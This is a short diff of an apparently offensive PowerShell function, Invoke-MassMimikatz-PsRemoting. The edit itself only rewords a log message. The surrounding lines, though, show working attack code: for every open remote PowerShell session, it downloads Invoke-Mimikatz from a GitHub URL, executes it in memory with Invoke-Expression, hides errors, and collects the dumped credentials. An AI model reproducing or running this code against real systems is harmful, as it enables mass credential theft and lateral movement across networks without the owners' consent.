@@ -575,7 +575,7 @@ function Invoke-MassMimikatz-PsRemoting
             if($SessionCount -ge 1){
 
                 # run the mimikatz command
-                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
+                Write-verbose "Running Mimikatz against $SessionCount open ps sessions..."
                 $x = Get-PSSession
                 [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
                 $TblResults = Parse-Mimikatz -raw $MimikatzOutput
